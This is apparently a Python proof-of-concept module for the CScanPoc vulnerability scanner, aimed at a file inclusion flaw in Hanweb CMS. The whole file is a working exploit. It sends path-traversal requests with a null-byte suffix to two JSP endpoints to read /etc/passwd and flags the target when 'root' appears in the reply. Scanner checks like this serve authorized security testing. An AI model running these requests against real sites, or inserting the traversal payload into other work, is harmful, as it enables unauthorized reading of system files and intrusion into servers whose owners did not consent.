# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'hanweb_0013' # 平台漏洞编号，留空
    name = '大汉cms 任意文件包含'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2015-05-29'  # 漏洞公布时间
    desc = '''
        大汉cms，漏洞文件地址：
        /lm/front/reg_2.jsp?sysid=
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '大汉网络'  # 漏洞应用名称
    product_version = '大汉cms'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '304b65bc-f8e0-4632-a4ab-469794a17f0d'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
    
            #refer     :  http://www.wooyun.org/bugs/wooyun-2015-0148311
            ##refer     :  http://www.wooyun.org/bugs/wooyun-2015-0116997
            hh = hackhttp.hackhttp()
            arg = self.target       
            url = arg + '/lm/front/mailwrite_over.jsp?editpagename=/../../../../../../../../../../../../../etc/passwd%00.ftl'
            url2 = arg + '/lm/front/reg_2.jsp?sysid=/../../../../../../../../../../../../../etc/passwd%00%23'
            code, head, res, errcode, _ = hh.http(url)
            code2, head2, res2, errcode2, _ = hh.http(url2)

            if code2==200 and re.search('root', res2):
                #security_hole(url2+'  大汉cms任意文件包含')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
